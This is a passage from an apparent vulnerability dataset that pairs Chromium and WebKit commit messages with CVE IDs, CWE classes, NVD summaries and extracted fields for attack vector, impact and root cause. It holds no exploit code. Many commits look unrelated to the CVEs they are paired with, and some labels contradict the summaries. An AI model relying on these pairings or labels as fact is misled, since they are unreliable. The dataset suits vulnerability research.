):\n(WebCore::jsTestObjPrototypeFunctionOverloadedMethod5):\n(WebCore::jsTestObjPrototypeFunctionOverloadedMethod6):\n(WebCore::jsTestObjPrototypeFunctionOverloadedMethod7):\n(WebCore::jsTestObjConstructorFunctionClassMethod2):\n(WebCore::jsTestObjConstructorFunctionOverloadedMethod11):\n(WebCore::jsTestObjConstructorFunctionOverloadedMethod12):\n(WebCore::jsTestObjPrototypeFunctionMethodWithUnsignedLongArray):\n(WebCore::jsTestObjPrototypeFunctionConvert1):\n(WebCore::jsTestObjPrototypeFunctionConvert2):\n(WebCore::jsTestObjPrototypeFunctionConvert3):\n(WebCore::jsTestObjPrototypeFunctionConvert4):\n(WebCore::jsTestObjPrototypeFunctionConvert5):\n(WebCore::jsTestObjPrototypeFunctionStrictFunction):\n* bindings\/scripts\/test\/JS\/JSTestSerializedScriptValueInterface.cpp:\n(WebCore::JSTestSerializedScriptValueInterfaceConstructor::constructJSTestSerializedScriptValueInterface):\n(WebCore::jsTestSerializedScriptValueInterfacePrototypeFunctionAcceptTransferList):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@115536 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The HTML parser in Google Chrome before 12.0.742.112 does not properly address *lifetime and re-entrancy issues,* which allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"implement a helper method createnotenoughargumentserror ( ) http : \/\/<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not properly address * lifetime and re - entrancy issues ","Attack Type":"remote attacker"},{"commit_id":"bf381d8a02c3d272d4dd879ac719d8993dfb5ad6","cve_id":"CVE-2011-2351","cwe_id":"CWE-399","commit_message":"Enable HistoryModelWorker by default, now that bug 69561 is fixed.\n\nBUG=69561\nTEST=Run sync manually and run integration tests, sync should not crash.\n\nReview URL: http:\/\/codereview.chromium.org\/7016007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@85211 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 12.0.742.112 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving SVG use elements.","commit_message_1":"enable historymodelworker by default , now that bug <number> is fixed","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving svg use elements","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within text selection","Attack Type":"remote attacker"},{"commit_id":"e755d9faf5c7d75a8ea290892cb1b5cc07c412ec","cve_id":"CVE-2011-2349","cwe_id":"CWE-399","commit_message":"cros: The next 100 clang plugin errors.\n\nBUG=none\nTEST=none\nTBR=dpolukhin\n\nReview URL: http:\/\/codereview.chromium.org\/7022008\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@85418 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 12.0.742.112 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to text selection.","commit_message_1":"the next <number> clang plugin error","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to text selection","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within text selection","Attack Type":"remote attacker"},{"commit_id":"5fd35e5359c6345b8709695cd71fba307318e6aa","cve_id":"CVE-2011-1799","cwe_id":"CWE-20","commit_message":"Source\/WebCore: Fix for bug 64046 - Wrong image height in absolutely positioned div in\nrelatively positioned parent with bottom padding.\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=64046\n\nPatch by Kulanthaivel Palanichamy <kulanthaivel@codeaurora.org> on 2011-07-21\nReviewed by David Hyatt.\n\nTest: fast\/css\/absolute-child-with-percent-height-inside-relative-parent.html\n\n* rendering\/RenderBox.cpp:\n(WebCore::RenderBox::availableLogicalHeightUsing):\n\nLayoutTests: Test to cover absolutely positioned child with percentage height\nin relatively positioned parent with bottom padding.\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=64046\n\nPatch by Kulanthaivel Palanichamy <kulanthaivel@codeaurora.org> on 2011-07-21\nReviewed by David Hyatt.\n\n* fast\/css\/absolute-child-with-percent-height-inside-relative-parent-expected.txt: Added.\n* fast\/css\/absolute-child-with-percent-height-inside-relative-parent.html: Added.\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@91533 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 11.0.696.68 does not properly perform casts of variables during interaction with the WebKit engine, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"fix for bug <number> - wrong image height in absolutely positioned div in relatively positioned parent with bottom padding","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not properly perform casts of variables during interaction with the webkit engine","Attack Type":"remote attacker"},{"commit_id":"1777aa6484af15014b8691082a8c3075418786f5","cve_id":"CVE-2011-1800","cwe_id":"CWE-189","commit_message":"[Qt][WK2] Allow transparent WebViews\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=80608\n\nReviewed by Tor Arne Vestb\u00f8.\n\nAdded support for transparentBackground in QQuickWebViewExperimental.\nThis uses the existing drawsTransparentBackground property in WebKit2.\nAlso, changed LayerTreeHostQt to set the contentsOpaque flag when the root layer changes,\notherwise the change doesn't take effect.\n\nA new API test was added.\n\n* UIProcess\/API\/qt\/qquickwebview.cpp:\n(QQuickWebViewPrivate::setTransparentBackground):\n(QQuickWebViewPrivate::transparentBackground):\n(QQuickWebViewExperimental::transparentBackground):\n(QQuickWebViewExperimental::setTransparentBackground):\n* UIProcess\/API\/qt\/qquickwebview_p.h:\n* UIProcess\/API\/qt\/qquickwebview_p_p.h:\n(QQuickWebViewPrivate):\n* UIProcess\/API\/qt\/tests\/qquickwebview\/tst_qquickwebview.cpp:\n(tst_QQuickWebView):\n(tst_QQuickWebView::transparentWebViews):\n* WebProcess\/WebPage\/qt\/LayerTreeHostQt.cpp:\n(WebKit::LayerTreeHostQt::LayerTreeHostQt):\n(WebKit::LayerTreeHostQt::setRootCompositingLayer):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@110254 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple integer overflows in the SVG Filters implementation in WebCore in WebKit in Google Chrome before 11.0.696.68 allow remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"added support for transparentbackground in qquickwebviewexperimental","Vulnerability Type":"multiple integer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by multiple integer overflows within SVG filters","Attack Type":"remote attacker"},{"commit_id":"b3ae5db129f88dae153880e84bdabea8ce2ca89b","cve_id":"CVE-2011-1300","cwe_id":"CWE-189","commit_message":"chromeos: Replace copy-and-pasted code with macros.\n\nThis replaces a bunch of duplicated-per-library cros\nfunction definitions and comments.\n\nBUG=none\nTEST=built it\n\nReview URL: http:\/\/codereview.chromium.org\/6086007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@70070 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The Program::getActiveUniformMaxLength function in libGLESv2\/Program.cpp in libGLESv2.dll in the WebGLES library in Almost Native Graphics Layer Engine (ANGLE), as used in Mozilla Firefox 4.x before 4.0.1 on Windows and in the GPU process in Google Chrome before 10.0.648.205 on Windows, allows remote attackers to execute arbitrary code via unspecified vectors, related to an *off-by-three* error.","commit_message_1":"replace copy-and-pasted code with macro","Vulnerability Type":"Numeric Errors","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service","Root Cause":"caused by an off-by-three error","Attack Type":"remote attacker"},{"commit_id":"0934e35f418895925345d059490e27d643db1133","cve_id":"CVE-2011-1291","cwe_id":"CWE-119","commit_message":"Make ToUpper and ToLower properly handle embedded NULLs in the input.\n\nBUG=72517\nTEST=included unit test\nReview URL: http:\/\/codereview.chromium.org\/6625046\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@77502 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 10.0.648.204 does not properly handle base strings, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors, related to a *buffer error.*","commit_message_1":"make toupper and tolower properly handle embedded null in the input","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors , related to a * buffer error","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not properly handle base strings","Attack Type":"remote attacker"},{"commit_id":"5f372f899b8709dac700710b5f0f90959dcf9ecb","cve_id":"CVE-2011-1292","cwe_id":"CWE-399","commit_message":"Add support for autofill server experiments\n\nBUG=none\nTEST=unit_tests --gtest_filter=AutoFillMetricsTest.QualityMetricsWithExperimentId:AutoFillQueryXmlParserTest.ParseExperimentId\n\nReview URL: http:\/\/codereview.chromium.org\/6260027\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@73216 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the frame-loader implementation in Google Chrome before 10.0.648.204 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"add support for autofill server experiment bug=none review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within the frame loader","Attack Type":"remote attacker"},{"commit_id":"c90c6ca59378d7e86d1a2f28fe96bada35df1508","cve_id":"CVE-2011-1296","cwe_id":"CWE-20","commit_message":"Rename the TabContentWrapper pieces to be \"TabHelper\"s. (Except for the PasswordManager... for now.) Also, just pre-create them up-front. It saves us effort, as they're all going to be eventually created anyway, so being lazy saves us nothing and creates headaches since the rules about what can be lazy differ from feature to feature.\n\nBUG=71097\nTEST=zero visible change\n\nReview URL: http:\/\/codereview.chromium.org\/6480117\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@75170 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 10.0.648.204 does not properly handle SVG text, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors that lead to a *stale pointer.*","commit_message_1":"rename the tabcontentwrapper piece to be `` tabhelper '' s","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unknown vectors that lead to a * stale pointer","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not properly handle svg text ","Attack Type":"remote attacker"},{"commit_id":"7bc64304a46b76928da4149693bb4e60907e54c8","cve_id":"CVE-2012-5112","cwe_id":"CWE-399","commit_message":"Disable tcmalloc profile files.\n\nBUG=154983\nTBR=darin@chromium.org\nNOTRY=true\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11087041\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@161048 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the SVG implementation in WebKit, as used in Google Chrome before 22.0.1229.94, allows remote attackers to execute arbitrary code via unspecified vectors.","commit_message_1":"disable tcmalloc profile file","Vulnerability Type":"use - after - free","Attack Vector":"via unknown vectors","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free error within Webkit's SVG (Scalable Vector Graphics) functionality","Attack Type":"remote attacker"},{"commit_id":"d65b01ca819881a507b5e60c25a2f9caff58cd57","cve_id":"CVE-2012-5112","cwe_id":"CWE-399","commit_message":"Wipe out QuotaThreadTask.\n\nThis is a one of a series of refactoring patches for QuotaManager.\nhttp:\/\/codereview.chromium.org\/10872054\/\nhttp:\/\/codereview.chromium.org\/10917060\/\n\nBUG=139270\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10919070\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@154987 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the SVG implementation in WebKit, as used in Google Chrome before 22.0.1229.94, allows remote attackers to execute arbitrary code via unspecified vectors.","commit_message_1":"wipe out quotathreadtask","Vulnerability Type":"use - after - free","Attack Vector":"via unknown vectors","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free error within Webkit's SVG (Scalable Vector Graphics) functionality","Attack Type":"remote attacker"},{"commit_id":"a75c45bf1cad925548a75bf88f828443bc8ee27d","cve_id":"CVE-2012-5140","cwe_id":"CWE-416","commit_message":"Break path whereby AssociatedURLLoader::~AssociatedURLLoader() is re-entered on top of itself.\n\nBUG=159429\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11359222\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@168150 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 23.0.1271.97 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the URL loader.","commit_message_1":"is re-entered on top of itself","Vulnerability Type":"Use After Free","Attack Vector":"via vectors related to the url loader","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within URL loader","Attack Type":"remote attacker"},{"commit_id":"21fdcdd977e8ab479dd99c6d0d2f562dda98261d","cve_id":"CVE-2012-5141","cwe_id":null,"commit_message":"Restrict the Chromoting client plugin to use by extensions & apps.\n\nBUG=160456\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11365276\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@168289 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 23.0.1271.97 does not properly restrict instantiation of the Chromoting client plug-in, which has unspecified impact and attack vectors.","commit_message_1":"restrict the chromoting client plugin to use by extension & apps","Vulnerability Type":"unspecified","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"execute arbitrary code","Root Cause":"does not properly restrict instantiation of the chromoting client plug -","Attack Type":"remote attacker"},{"commit_id":"8083841913b8eb8018ae52f67c923f0b3d66c466","cve_id":"CVE-2012-5138","cwe_id":null,"commit_message":"Apply missing kParentDirectory check\n\nBUG=161564\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11414046\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@168692 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 23.0.1271.95 does not properly handle file paths, which has unspecified impact and attack vectors.","commit_message_1":"apply missing kparentdirectory check bug=<number> review url : http : \/\/<file>","Vulnerability Type":"unspecified","Attack Vector":"has unknown attack vector","Impact":"has unknown impact","Root Cause":"does not properly handle file paths","Attack Type":"remote attacker"},{"commit_id":"d0c31f0342cefc46a3b3d80359a9779d044d4c0d","cve_id":"CVE-2012-5131","cwe_id":null,"commit_message":"Remove BlobRegistry indirection since there is only one implementation.\n\nBUG=\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/15851008\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@152746 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 23.0.1271.91 on Mac OS X does not properly mitigate improper rendering behavior in the Intel GPU driver, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"remove blobregistry indirection since there is only one implementation","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not properly mitigate improper rendering behavior","Attack Type":"remote attacker"},{"commit_id":"30afcc0242bd789a7b67e1ca8fe829640279a3cf","cve_id":"CVE-2012-5133","cwe_id":"CWE-416","commit_message":"Prevent overflow of width\/height of layout overflow rectangle which can cause scroll bar to misfunction.\n\nWhen a child element is positioned very far away the width\/height of layout overflow rectangle may overflow. The patch detects such cases in RenderOverflow::addLayoutOverflow and shift the top\/left edges of the rectangle to avoid overflow. \n\nBUG=267462\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/22799017\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@156567 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 23.0.1271.91 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to SVG filters.","commit_message_1":"prevent overflow of width\/height of layout overflow rectangle which can cause scroll bar to misfunction","Vulnerability Type":"Use After Free","Attack Vector":"via vectors related to svg filters","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"4cc2a2c82e1094c2d2044f4e55ce03ad689bcc42","cve_id":"CVE-2012-5132","cwe_id":null,"commit_message":"Fix clobbered build issue.\n\nTBR=jochen@chromium.org\nNOTRY=true\nBUG=269698\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/22425005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@155711 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 23.0.1271.91 allows remote attackers to cause a denial of service (application crash) via a response with chunked transfer coding.","commit_message_1":"fix clobbered build issue","Vulnerability Type":"application crash","Attack Vector":"via a response with chunked transfer coding","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an error related to chunked encoding","Attack Type":"remote attacker"},{"commit_id":"6e487b9db2ff0324523a040180f8da42796aeef5","cve_id":"CVE-2012-5134","cwe_id":"CWE-119","commit_message":"Add a check to prevent len from going negative in xmlParseAttValueComplex.\n\nBUG=158249\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11343029\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@164867 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Heap-based buffer underflow in the xmlParseAttValueComplex function in parser.c in libxml2 2.9.0 and earlier, as used in Google Chrome before 23.0.1271.91 and other products, allows remote attackers to cause a denial of service or possibly execute arbitrary code via crafted entities in an XML document.","commit_message_1":"add a check to prevent len from going negative in xmlparseattvaluecomplex","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted entities in an xml document","Impact":"cause a denial of service or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by libxml2","Attack Type":"remote attacker"},{"commit_id":"b755ebba29dd405d6f1e4cf70f5bc81ffd33b0f6","cve_id":"CVE-2012-5135","cwe_id":"CWE-399","commit_message":"Guard against the same PrintWebViewHelper being re-entered.\n\nBUG=159165\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11367076\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@165821 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 23.0.1271.91 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to printing.","commit_message_1":"guard against the same printwebviewhelper being re-entered","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to printing","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within printing","Attack Type":"remote attacker"},{"commit_id":"401d30ef93030afbf7e81e53a11b68fc36194502","cve_id":"CVE-2012-5136","cwe_id":"CWE-20","commit_message":"Refactoring: Move m_mayDisplaySeamlesslyWithParent down to Document\n\nThe member is used only in Document, thus no reason to\nstay in SecurityContext.\n\nTEST=none\nBUG=none\nR=haraken@chromium.org, abarth, haraken, hayato\n\nReview URL: https:\/\/codereview.chromium.org\/27615003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@159829 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 23.0.1271.91 does not properly perform a cast of an unspecified variable during handling of the INPUT element, which allows remote attackers to cause a denial of service or possibly have unknown other impact via a crafted HTML document.","commit_message_1":"move m_maydisplayseamlesslywithparent down to document the member is used only in document , thus no reason to stay in securitycontext","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html document","Impact":"cause a denial of service or possibly have unknown other impact","Root Cause":"does not properly perform a cast of an unspecified variable during handling of the input element","Attack Type":"remote attacker"},{"commit_id":"9597042cad54926f50d58f5ada39205eb734d7be","cve_id":"CVE-2012-2900","cwe_id":null,"commit_message":"Revert 137988 - VAVDA is the hardware video decode accelerator for Chrome on Linux and ChromeOS for Intel CPUs (Sandy Bridge and newer).\n\nThis CL enables VAVDA acceleration for ChromeOS, both for HTML5 video and Flash.\n    \nThe feature is currently hidden behind a command line flag and can be enabled by adding the --enable-vaapi parameter to command line.\n    \nBUG=117062\nTEST=Manual runs of test streams.\n    \nChange-Id: I386e16739e2ef2230f52a0a434971b33d8654699\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9814001\n\n\nThis is causing crbug.com\/129103\nTBR=posciak@chromium.org\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10411066\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@138208 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Skia, as used in Google Chrome before 22.0.1229.92, does not properly render text, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"revert <number> - vavda is the hardware video decode accelerator for chrome on linux and chromeos for intel cpu ( sandy bridge and newer )","Vulnerability Type":"application crash","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"does not properly render text ","Attack Type":"remote attacker"},{"commit_id":"6d2aef28cb0b677af468ebf3e32a176a7c37086e","cve_id":"CVE-2012-5108","cwe_id":"CWE-362","commit_message":"Revert r157378 as it caused WebRTC to dereference null pointers when restarting a call.\n\nI've kept my unit test changes intact but disabled until I get a proper fix.\n\nBUG=147499,150805\nTBR=henrika\n\nReview URL: https:\/\/codereview.chromium.org\/10946040\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@157626 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Race condition in Google Chrome before 22.0.1229.92 allows remote attackers to execute arbitrary code via vectors related to audio devices.","commit_message_1":"revert r157378 a it caused webrtc to dereference null pointer when restarting a call","Vulnerability Type":"Race Condition","Attack Vector":"via vectors related to audio devices","Impact":"execute arbitrary code","Root Cause":"caused by a race condition related to audio device handling","Attack Type":"remote attacker"},{"commit_id":"7fa8bd35982700cb2cb6ce22d05128c019a2b587","cve_id":"CVE-2012-5110","cwe_id":"CWE-125","commit_message":"SelectElement should remove an option when null is assigned by indexed setter\n\nFix bug embedded in r151449\n\nsee\nhttp:\/\/src.chromium.org\/viewvc\/blink?revision=151449&view=revision\n\nR=haraken@chromium.org, tkent@chromium.org, eseidel@chromium.org\nBUG=262365\nTEST=fast\/forms\/select\/select-assign-null.html\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/19947008\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@154743 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The compositor in Google Chrome before 22.0.1229.92 allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"selectelement should remove an option when null is assigned by indexed setter fix bug embedded in r151449 see http : \/\/<file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an error related to compositor handling","Attack Type":"remote attacker"},{"commit_id":"ef97ce340c462d5212336f09bf8075d1cb10faa4","cve_id":"CVE-2012-5111","cwe_id":null,"commit_message":"Handle crashing Pepper plug-ins the same as crashing NPAPI plug-ins.\n\nBUG=151895\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10956065\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@158364 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 22.0.1229.92 does not monitor for crashes of Pepper plug-ins, which has unspecified impact and remote attack vectors.","commit_message_1":"handle crashing pepper plug-in the same a crashing npapi plug-in","Vulnerability Type":"unspecified","Attack Vector":"has unknown attack vector","Impact":"has unknown impact","Root Cause":"does not monitor for crashes of pepper plug - ins","Attack Type":"remote attacker"},{"commit_id":"7f8cdab6fda192d15e45a3e9682b1eec427870c5","cve_id":"CVE-2012-2889","cwe_id":"CWE-79","commit_message":"[views] Remove header bar on shell windows created with {frame: none}.\n\nBUG=130182\nR=ben@chromium.org\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10597003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@143439 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Cross-site scripting (XSS) vulnerability in Google Chrome before 22.0.1229.79 allows remote attackers to inject arbitrary web script or HTML via vectors involving frames, aka *Universal XSS (UXSS).*","commit_message_1":"remove header bar on shell window created with { frame : none }","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via vectors involving frames , aka * universal xss ( uxss ) . *","Impact":"inject arbitrary web script or html","Root Cause":"An error","Attack Type":"remote attacker"},{"commit_id":"10b688f204a81d8447c83021624220607353552e","cve_id":"CVE-2012-2886","cwe_id":"CWE-79","commit_message":"ash: Make UserActivityDetector ignore synthetic mouse events\n\nThis may have been preventing us from suspending (e.g.\nmouse event is synthesized in response to lock window being\nshown so Chrome tells powerd that the user is active).\n\nBUG=133419\nTEST=added\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10574044\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@143437 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Cross-site scripting (XSS) vulnerability in Google Chrome before 22.0.1229.79 allows remote attackers to inject arbitrary web script or HTML via vectors related to the Google V8 bindings, aka *Universal XSS (UXSS).*","commit_message_1":"make useractivitydetector ignore synthetic mouse event this may have been preventing u from suspending ( <file>","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via vectors related to the google v8 bindings , aka * universal xss ( uxss ) ","Impact":"inject arbitrary web script or html","Root Cause":"An error","Attack Type":"remote attacker"},{"commit_id":"f7b020b3d36def118881daa4402c44ca72271482","cve_id":"CVE-2012-2883","cwe_id":"CWE-119","commit_message":"INPUT_MULTIPLE_FIELDS_UI: Inconsistent value of aria-valuetext attribute\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=107897\n\nReviewed by Kentaro Hara.\n\nSource\/WebCore:\n\naria-valuetext and aria-valuenow attributes had inconsistent values in\na case of initial empty state and a case that a user clears a field.\n\n- aria-valuetext attribute should have \"blank\" message in the initial\n  empty state.\n- aria-valuenow attribute should be removed in the cleared empty state.\n\nAlso, we have a bug that aira-valuenow had a symbolic value such as \"AM\"\n\"January\". It should always have a numeric value according to the\nspecification.\nhttp:\/\/www.w3.org\/TR\/wai-aria\/states_and_properties#aria-valuenow\n\nNo new tests. Updates fast\/forms\/*-multiple-fields\/*-multiple-fields-ax-aria-attributes.html.\n\n* html\/shadow\/DateTimeFieldElement.cpp:\n(WebCore::DateTimeFieldElement::DateTimeFieldElement):\nSet \"blank\" message to aria-valuetext attribute.\n(WebCore::DateTimeFieldElement::updateVisibleValue):\naria-valuenow attribute should be a numeric value. Apply String::number\nto the return value of valueForARIAValueNow.\nRemove aria-valuenow attribute if nothing is selected.\n(WebCore::DateTimeFieldElement::valueForARIAValueNow):\nAdded.\n* html\/shadow\/DateTimeFieldElement.h:\n(DateTimeFieldElement): Declare valueForARIAValueNow.\n\n* html\/shadow\/DateTimeSymbolicFieldElement.cpp:\n(WebCore::DateTimeSymbolicFieldElement::valueForARIAValueNow):\nAdded. Returns 1 + internal selection index.\nFor example, the function returns 1 for January.\n* html\/shadow\/DateTimeSymbolicFieldElement.h:\n(DateTimeSymbolicFieldElement): Declare valueForARIAValueNow.\n\nLayoutTests:\n\nFix existing tests to show aria-valuenow attribute values.\n\n* fast\/forms\/resources\/multiple-fields-ax-aria-attributes.js: Added.\n* fast\/forms\/date-multiple-fields\/date-multiple-fields-ax-aria-attributes-expected.txt:\n* fast\/forms\/date-multiple-fields\/date-multiple-fields-ax-aria-attributes.html:\nUse multiple-fields-ax-aria-attributes.js.\nAdd tests for initial empty-value state.\n* fast\/forms\/month-multiple-fields\/month-multiple-fields-ax-aria-attributes-expected.txt:\n* fast\/forms\/month-multiple-fields\/month-multiple-fields-ax-aria-attributes.html:\nUse multiple-fields-ax-aria-attributes.js.\n* fast\/forms\/time-multiple-fields\/time-multiple-fields-ax-aria-attributes-expected.txt:\n* fast\/forms\/time-multiple-fields\/time-multiple-fields-ax-aria-attributes.html:\nUse multiple-fields-ax-aria-attributes.js.\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@140803 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Skia, as used in Google Chrome before 22.0.1229.79, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger an out-of-bounds write operation, a different vulnerability than CVE-2012-2874.","commit_message_1":"inconsistent value of aria-valuetext attribute http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger an out - of - bounds write operation , a different vulnerability than cve - 2012 - 2874","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"An error","Attack Type":"remote attacker"},{"commit_id":"3b0d77670a0613f409110817455d2137576b485a","cve_id":"CVE-2012-2888","cwe_id":"CWE-399","commit_message":"Revert 143656 - Add an IPC channel between the NaCl loader process and the renderer.\nBUG=116317\nTEST=ppapi, nacl tests, manual testing for experimental IPC proxy.\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10641016\n\nTBR=bbudge@chromium.org\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10625007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@143665 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 22.0.1229.79 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving 